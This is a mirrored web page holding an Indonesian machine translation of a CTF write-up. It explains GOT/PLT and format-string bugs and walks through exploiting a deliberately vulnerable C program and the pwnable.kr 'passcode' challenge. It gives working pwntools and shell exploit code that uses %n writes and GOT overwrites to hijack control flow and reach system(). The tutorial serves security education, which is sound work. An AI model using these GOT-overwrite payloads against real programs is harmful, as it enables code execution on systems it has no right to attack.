<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🚣🏽 😰 👨🏽‍🚒 Memecahkan pekerjaan dengan pwnable.kr 05 - passcode. Tabel tautan prosedur penulisan ulang melalui kerentanan format string 🌹 🐶 👨‍👨‍👧‍👦</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Dalam artikel ini kita akan menganalisis: apa itu tabel global offset, tabel hubungan prosedur dan penulisan ulang melalui kerentanan string format. K...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Memecahkan pekerjaan dengan pwnable.kr 05 - passcode. Tabel tautan prosedur penulisan ulang melalui kerentanan format string</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/460647/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/al/py/ef/alpyefagnx81cc2xc1ncjqs8lus.png" alt="gambar"></div><br>  Dalam artikel ini kita akan menganalisis: apa itu tabel global offset, tabel hubungan prosedur dan penulisan ulang melalui kerentanan string format.  Kami juga akan menyelesaikan tugas ke-5 dari situs <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">pwnable.kr</a> . <br><br><div class="spoiler">  <b class="spoiler_title">Informasi Organisasi</b> <div class="spoiler_text">  Terutama bagi mereka yang ingin mempelajari sesuatu yang baru dan berkembang di bidang informasi dan keamanan komputer, saya akan menulis dan berbicara tentang kategori berikut: <br><br><ul><li>  PWN; </li><li>  kriptografi (Crypto); </li><li>  teknologi jaringan (Jaringan); </li><li>  membalikkan (Reverse Engineering); </li><li>  steganografi (Stegano); </li><li>  pencarian dan eksploitasi kerentanan WEB. </li></ul><br>  Selain itu, saya akan membagikan pengalaman saya dalam forensik komputer, analisis malware dan firmware, serangan pada jaringan nirkabel dan jaringan area lokal, melakukan pentest dan menulis eksploitasi. <br><a name="habracut"></a><br>  Agar Anda dapat mengetahui tentang artikel baru, perangkat lunak, dan informasi lainnya, saya membuat <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">saluran di Telegram</a> dan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">grup untuk membahas masalah apa pun</a> di bidang ICD.  Juga, saya pribadi akan mempertimbangkan permintaan pribadi Anda, pertanyaan, saran dan rekomendasi <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">secara pribadi dan akan menjawab semua orang</a> . <br><cut></cut><br>  Semua informasi disediakan hanya untuk tujuan pendidikan.  Penulis dokumen ini tidak bertanggung jawab atas kerusakan yang disebabkan seseorang sebagai akibat dari menggunakan pengetahuan dan metode yang diperoleh sebagai hasil dari mempelajari dokumen ini. <br></div></div><br><h2>  Tabel Hubungan Global dan Tabel Hubungan Prosedur </h2><br>  Pustaka yang terhubung secara dinamis dimuat dari file terpisah ke dalam memori saat boot atau pada saat runtime.  Dan, oleh karena itu, alamat mereka di memori tidak diperbaiki untuk menghindari konflik memori dengan perpustakaan lain.  Selain itu, mekanisme keamanan ASLR akan mengacak alamat setiap modul pada saat boot. <br><br>  Global Offset Table (GOT) - Tabel alamat yang disimpan di bagian data.  Ini digunakan saat run time untuk mencari alamat variabel global yang tidak dikenal pada waktu kompilasi.  Tabel ini di bagian data dan tidak digunakan oleh semua proses.  Semua alamat absolut yang dirujuk oleh bagian kode disimpan dalam tabel GOT ini.  Bagian kode menggunakan offset relatif untuk mengakses alamat absolut ini.  Dan dengan demikian, kode perpustakaan dapat dibagi oleh proses, bahkan jika mereka dimuat ke ruang alamat memori yang berbeda. <br><br>  Tabel Tautan Prosedur (PLT) berisi kode lompatan untuk memanggil fungsi-fungsi umum yang alamatnya disimpan dalam GOT, yaitu PLT berisi alamat yang digunakan untuk menyimpan data alamat (alamat) dari GOT. <br><br>  Pertimbangkan mekanisme menggunakan contoh: <br><br><ol><li>  Dalam kode program, fungsi cetak eksternal disebut. </li><li>  Aliran kontrol masuk ke catatan n di PLT, dan transisi terjadi pada offset relatif, bukan alamat absolut. </li><li>  Pergi ke alamat yang tersimpan di GOT.  Pointer fungsi yang disimpan dalam tabel GOT menunjuk kembali ke potongan kode PLT. </li><li>  Jadi, jika printf dipanggil untuk pertama kalinya, konverter penghubung dinamis dipanggil untuk mendapatkan alamat aktual dari fungsi target. </li><li>  Alamat printf ditulis ke tabel GOT, dan kemudian printf dipanggil. </li><li>  Jika printf dipanggil lagi dalam kode, resolver tidak akan lagi dipanggil karena alamat printf sudah disimpan dalam GOT. </li></ol><cut></cut><br><img src="https://habrastorage.org/webt/j4/yh/xf/j4yhxfc-twcuo9m9e5o2nanwoug.png" alt="gambar"><br><br>  Saat menggunakan pengikatan tertunda ini, pointer ke fungsi yang tidak digunakan pada saat run tidak diperbolehkan.  Dengan demikian, ini menghemat banyak waktu. <br><br>  Agar mekanisme ini berfungsi, bagian-bagian berikut ada dalam file: <br><br><ul><li>  .got - berisi entri untuk GOT; </li><li>  .lt - berisi entri untuk PLT; </li><li>  .got.plt - berisi hubungan alamat GOT - PLT; </li><li>  .plt.got - berisi hubungan alamat PLT - GOT. </li></ul><br>  Karena bagian .got.plt adalah array dari pointer dan diisi selama eksekusi program (mis., Penulisan diperbolehkan di dalamnya), kita dapat menimpa salah satunya dan mengontrol aliran eksekusi program. <br><br><h2>  Memformat string </h2><br>  String format adalah string yang menggunakan penentu format.  Penentu format ditunjukkan oleh simbol "%" (untuk memasukkan tanda persen, gunakan urutan "%%"). <br><br><pre><code class="cpp hljs">pritntf(“output %s <span class="hljs-number"><span class="hljs-number">123</span></span>”, “str”); output str <span class="hljs-number"><span class="hljs-number">123</span></span></code> </pre> <br>  Penentu format yang paling penting: <br><br><ul><li>  d - angka bertanda desimal, ukuran default, sizeof (int); </li><li>  x dan X adalah angka heksadesimal yang tidak ditandatangani, x menggunakan huruf kecil (abcdef), huruf besar X (ABCDEF), ukuran standarnya adalah sizeof (int); </li><li>  s - line output dengan nol terminating byte; </li><li>  n adalah jumlah karakter yang ditulis pada saat urutan perintah yang mengandung n muncul. </li></ul><br><h2>  Mengapa memformat kerentanan string dimungkinkan </h2><br>  Kerentanan ini terdiri dari penggunaan salah satu fungsi format output tanpa menentukan format (seperti dalam contoh berikut).  Jadi, kita sendiri dapat menentukan format output, yang mengarah pada kemampuan untuk membaca nilai dari stack, dan ketika menentukan format khusus, untuk menulis ke memori. <br><cut></cut><br>  Pertimbangkan kerentanan dalam contoh berikut: <br><br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; int main(){ char input[100]; printf("Start program!!!\n"); printf("Input: "); scanf("%s", &amp;input); printf("\nYour input: "); printf(input); printf("\n"); exit(0); }</span></span></span></span></code> </pre> <br>  Dengan demikian, baris berikutnya tidak menentukan format output. <br><br><pre> <code class="cpp hljs"><span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(input);</code> </pre> <br>  Kompilasi program. <br><br><pre> <code class="bash hljs">gcc vuln1.c -o vuln -no-pie</code> </pre> <br>  Mari kita lihat nilai pada stack dengan memasukkan baris yang berisi penentu format. <br><br><img src="https://habrastorage.org/webt/i9/ib/es/i9ibeshbd2zhx5zmza0gxoegc-e.png" alt="gambar"><br><br>  Dengan demikian, saat memanggil printf (input), panggilan berikut dipicu: <br><br><pre> <code class="cpp hljs"><span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(“%p-%p-%p-%p-%p“);</code> </pre> <br>  Masih memahami apa yang ditampilkan oleh program.  Fungsi printf memiliki beberapa argumen, yang merupakan data untuk string format. <br><br>  Pertimbangkan contoh panggilan fungsi dengan argumen berikut: <br><br><pre> <code class="cpp hljs"><span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(“Number - %d, addres - %<span class="hljs-number"><span class="hljs-number">08</span></span>x, <span class="hljs-built_in"><span class="hljs-built_in">string</span></span> - %s”, a, &amp;b, c);</code> </pre> <br>  Ketika fungsi ini dipanggil, tumpukan akan terlihat sebagai berikut. <br><br><img src="https://habrastorage.org/webt/vo/rj/n2/vorjn2194dvix4kr4mmzutja890.png" alt="gambar"><br><br>  Jadi, ketika specifier format terdeteksi, fungsi mengambil nilai stack.  Demikian pula, fungsi dari contoh kita akan mengambil 5 nilai dari tumpukan. <br><br><img src="https://habrastorage.org/webt/uj/_j/vc/uj_jvcokc0m81teugsjel-ovzsk.png" alt="gambar"><br><br>  Untuk mengkonfirmasi di atas, kami menemukan string format kami di tumpukan. <br><br><img src="https://habrastorage.org/webt/tm/og/pm/tmogpmxoiospc4wwcybi3daw-3u.png" alt="gambar"><br><br>  Saat menerjemahkan nilai dari tampilan hex, kita mendapatkan string “% -p% AAAA“.  Artinya, kami bisa mendapatkan nilai dari tumpukan. <br><br><h2>  GOT menimpa </h2><br>  Mari kita periksa kemampuan untuk menulis ulang GOT melalui kerentanan string format.  Untuk melakukan ini, mari kita loop program kami dengan menulis ulang alamat fungsi exit () ke alamat main.  Kami akan menimpa menggunakan pwntools.  Buat tata letak awal dan ulangi entri sebelumnya. <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * ex = process(<span class="hljs-string"><span class="hljs-string">'./vuln'</span></span>) payload = <span class="hljs-string"><span class="hljs-string">"AAAA%p-%p-%p-%p-%p-%p-%p-%p"</span></span> ex.sendline(payload) ex.interactive()</code> </pre> <br><img src="https://habrastorage.org/webt/ln/ej/lh/lnejlh85r86iny9le7wepst28mo.png" alt="gambar"><br><br>  Tetapi karena tergantung pada ukuran string yang dimasukkan, isi tumpukan akan berbeda, kami akan memastikan bahwa beban input selalu berisi jumlah karakter yang dimasukkan sama. <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%p-%p-%p-%p"</span></span>*<span class="hljs-number"><span class="hljs-number">5</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, ”*”)</code> </pre> <br><img src="https://habrastorage.org/webt/h8/sg/wg/h8sgwghgqjftpqreusafipcpz0s.png" alt="gambar"><br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%p-%p-%p-%p"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, ”*”)</code> </pre> <br><img src="https://habrastorage.org/webt/gj/bw/d-/gjbwd-9aigcck02hc2k9og5nfve.png" alt="gambar"><br><br>  Sekarang kita perlu mengetahui alamat GOT dari fungsi exit (), dan alamat fungsi utama.  Alamat utama akan ditemukan menggunakan gdb. <br><br><img src="https://habrastorage.org/webt/fp/bm/nn/fpbmnn6xs2bquxngua1igncslnm.png" alt="gambar"><br><br>  Alamat GOT dari exit () dapat ditemukan menggunakan gdb dan objdump. <br><br><img src="https://habrastorage.org/webt/_a/2o/pm/_a2opmke0_snnf_hczyzh0xtl64.png" alt="gambar"><br><br><img src="https://habrastorage.org/webt/qj/dj/yp/qjdjypxsia_iz1clauydnmtwdgy.png" alt="gambar"><br><br><pre> <code class="bash hljs">objdump -R vuln</code> </pre> <br><img src="https://habrastorage.org/webt/sf/of/qo/sfofqo2pj9dyvb57yf9hsdc1uw8.png" alt="gambar"><br><br>  Kami akan menulis alamat ini di program kami. <br><br><pre> <code class="python hljs">main_addr = <span class="hljs-number"><span class="hljs-number">0x401162</span></span> exit_addr = <span class="hljs-number"><span class="hljs-number">0x404038</span></span></code> </pre> <br>  Sekarang Anda perlu menulis ulang alamatnya.  Untuk menambahkan ke stack, alamat fungsi exit () dan alamat setelahnya, mis.  * (keluar ()) +1, dll.  Anda dapat menambahkannya menggunakan memuat kami. <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%p-%p-%p-%p-"</span></span>*<span class="hljs-number"><span class="hljs-number">5</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">"*"</span></span>) payload += pack(<span class="hljs-string"><span class="hljs-string">"Q"</span></span>, exit_addr) payload += pack(<span class="hljs-string"><span class="hljs-string">"Q"</span></span>, exit_addr+<span class="hljs-number"><span class="hljs-number">1</span></span>)</code> </pre> <br>  Jalankan dan tentukan akun mana yang menampilkan alamat. <br><br><img src="https://habrastorage.org/webt/_f/pg/cj/_fpgcjghcjfywqnhdh8qd1mc1ak.png" alt="gambar"><br><br>  Alamat-alamat ini ditampilkan pada posisi 14 dan 15. Anda dapat menampilkan nilai pada posisi tertentu sebagai berikut. <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%14$p"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">"*"</span></span>)</code> </pre> <br><img src="https://habrastorage.org/webt/xl/ss/3u/xlss3uiye9rnbwz9jxmn5skxcry.png" alt="gambar"><br><br>  Kami akan menulis ulang alamat dalam dua blok.  Untuk memulai, kami akan mencetak 4 nilai sehingga alamat kami ada di posisi 2 dan 4. <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%p%14$p%p%15$p"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">"*"</span></span>)</code> </pre> <br><img src="https://habrastorage.org/webt/yw/sy/py/ywsypywco_6skjhhsw1qr40bupc.png" alt="gambar"><br><br>  Sekarang kami memecah alamat main () menjadi dua blok: <br><blockquote>  0x401162 <br><br>  1) 0x62 = 98 (tulis pada 0x404038) <br>  2) 0x4011 - 0x62 = 16303 (tulis ke alamat 0x404039) </blockquote><br><br>  Kami menulisnya sebagai berikut: <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%98p%14$n%16303p%15$n"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">'*'</span></span>)</code> </pre> <br>  Kode lengkap: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * start_addr = <span class="hljs-number"><span class="hljs-number">0x401162</span></span> exit_addr = <span class="hljs-number"><span class="hljs-number">0x404038</span></span> ex = process(<span class="hljs-string"><span class="hljs-string">'./vuln'</span></span>) payload = (<span class="hljs-string"><span class="hljs-string">"%98p%14$n%16303p%15$n"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">'*'</span></span>) payload += pack(<span class="hljs-string"><span class="hljs-string">"Q"</span></span>, exit_addr) payload += pack(<span class="hljs-string"><span class="hljs-string">"Q"</span></span>, exit_addr+<span class="hljs-number"><span class="hljs-number">1</span></span>) ex.sendline(payload) ex.interactive()</code> </pre> <br><img src="https://habrastorage.org/webt/qi/vg/vr/qivgvrhzkucvpzfs6s-zwftuuhk.png" alt="gambar"><br><br>  Dengan demikian, program ini di-restart bukannya diakhiri.  Kami menulis ulang alamat keluar (). <br><br><h2>  Solusi pekerjaan kode sandi </h2><br>  Kami mengklik ikon pertama dengan tanda tangan kode sandi, dan kami diberitahu bahwa kami perlu terhubung melalui SSH dengan tamu kata sandi. <br><br><img src="https://habrastorage.org/webt/h2/jc/tj/h2jctjxsee5hardpu6glunfg2fk.png" alt="gambar"><br><br>  Saat terhubung, kami melihat spanduk yang sesuai. <br><br><img src="https://habrastorage.org/webt/-a/me/pp/-ameppolfflavwiv35qbkkgvg-8.png" alt="gambar"><br><br>  Mari cari tahu file apa yang ada di server, serta hak apa yang kita miliki. <br><br><pre> <code class="bash hljs">ls -l</code> </pre> <br><img src="https://habrastorage.org/webt/ds/2m/gv/ds2mgvxu30ah53peas04_wypwja.png" alt="gambar"><br><br>  Jadi, kita dapat membaca kode sumber program, karena ada hak untuk membaca untuk semua orang, dan menjalankan program kode sandi dengan hak-hak pemilik (bit sticky diatur).  Mari kita lihat hasil kodenya. <br><br><img src="https://habrastorage.org/webt/ld/mj/wr/ldmjwru5rsabi6jyr9o8rrbt2ps.png" alt="gambar"><br><br>  Ada kesalahan dalam fungsi login ().  Dalam scanf (), argumen kedua dilewatkan bukan alamat variabel &amp; passcode1, tetapi variabel itu sendiri, dan tidak diinisialisasi.  Karena variabel belum diinisialisasi, ini berisi "sampah" tidak tertulis yang tersisa setelah instruksi sebelumnya.  Artinya, scanf () akan menulis nomor ke alamat, yang akan menjadi data residual. <br><br><img src="https://habrastorage.org/webt/vt/5m/w4/vt5mw46djsyiiqhn5h7veqoi8b4.png" alt="gambar"><br><br>  Jadi, jika sebelum memanggil fungsi login, kita bisa mendapatkan kendali atas area memori ini, maka kita dapat menulis nomor apa saja ke alamat mana pun (sebenarnya mengubah logika program). <br><br>  Karena fungsi login () dipanggil segera setelah fungsi welcome (), mereka memiliki alamat bingkai tumpukan yang sama. <br><br><img src="https://habrastorage.org/webt/tj/zr/yi/tjzryim0sirg0i4t3agtqk4loty.png" alt="gambar"><br><br>  Mari kita periksa apakah kita dapat menulis data ke lokasi passcode1 mendatang.  Buka program di gdb dan bongkar fungsi login () dan selamat datang ().  Karena scanf memiliki dua parameter dalam kedua kasus, alamat variabel akan diteruskan ke fungsi terlebih dahulu.  Dengan demikian, alamat passcode1 adalah ebp-0x10, dan namanya adalah ebp-0x70. <br><br><img src="https://habrastorage.org/webt/qv/sj/li/qvsjliyjrjehr1lmvptgi5piju4.png" alt="gambar"><br><br><img src="https://habrastorage.org/webt/5t/uy/z3/5tuyz3pptyf76e32xe2idow-rnm.png" alt="gambar"><br><br>  Sekarang, mari kita hitung alamat passcode1 relatif terhadap nama, asalkan nilai ebpnya sama: <br><blockquote>  (&amp; nama) - (&amp; passcode1) = (ebp-0x70) - (ebp-0x10) = -96 <br>  &amp; passcode1 == &amp; name + 96 </blockquote>  Artinya, 4 byte terakhir dari nama - ini adalah "sampah" yang akan bertindak sebagai alamat untuk menulis ke fungsi login. <br><br>  Dalam artikel tersebut, kami melihat bagaimana Anda dapat mengubah logika aplikasi dengan menulis ulang alamat di GOT.  Mari kita lakukan di sini juga.  Karena scanf () diikuti oleh flush, maka pada alamat fungsi ini di GOT, kami menulis alamat instruksi untuk memanggil fungsi system () untuk membaca flag. <br><br><img src="https://habrastorage.org/webt/kx/8i/fk/kx8ifk5y4nzodxayzfdr0pyfjaa.png" alt="gambar"><br><br><img src="https://habrastorage.org/webt/hh/2l/sx/hh2lsxqchatzgvyhvzi_xqj8-ac.png" alt="gambar"><br><br><img src="https://habrastorage.org/webt/nc/vd/bw/ncvdbwjevpugfpt62no2jrnbumk.png" alt="gambar"><br><br>  Artinya, di alamat 0x804a004 Anda perlu menulis 0x80485e3 dalam bentuk desimal. <br><br><pre> <code class="bash hljs">python -c <span class="hljs-string"><span class="hljs-string">"print('A'*96 + '\x04\xa0\x04\x08' + str(0x080485e3))"</span></span> | ./passcode</code> </pre> <br><img src="https://habrastorage.org/webt/rh/pu/gf/rhpugfjpmu0ykmcgyc_geflsm5s.png" alt="gambar"><br><br>  Hasilnya, kami mendapat 10 poin, sejauh ini ini adalah tugas yang paling sulit. <br><br><img src="https://habrastorage.org/webt/mg/fm/0-/mgfm0-rba6sb8aehxzm583xrrg4.png" alt="gambar"><br><br>  File untuk artikel ini dilampirkan ke <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">saluran Telegram</a> .  Sampai jumpa di artikel berikut! <br><br>  Kami berada di saluran telegram: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">saluran di Telegram</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id460647/">https://habr.com/ru/post/id460647/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id460635/index.html">CLRium # 6: Concurrency & Parallelism. Dua hari: dari prosesor ke async / menunggu</a></li>
<li><a href="../id460637/index.html">Kontrol lampu pada ZigBee</a></li>
<li><a href="../id460641/index.html">YouTokenToMe: alat untuk tokenisasi cepat teks dari Tim VKontakte</a></li>
<li><a href="../id460643/index.html">Distribusi titik-titik pada bola yang seragam</a></li>
<li><a href="../id460645/index.html">Berbuat baik berbuat jahat: menulis kode jahat dengan Go, Bagian 1</a></li>
<li><a href="../id460651/index.html">Pertemuan Society of Anonymous Testers: TMS, pemantauan pemantauan, penilaian kualitas pencarian dan tes iOS asli</a></li>
<li><a href="../id460655/index.html">Bagaimana saya mematahkan Telegram</a></li>
<li><a href="../id460659/index.html">Menggunakan Pipa untuk Pivoting</a></li>
<li><a href="../id460661/index.html">Semua yang perlu Anda ketahui tentang Node.js</a></li>
<li><a href="../id460665/index.html">Draft FAQ: Mengapa standar C ++ keluar setiap tiga tahun?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>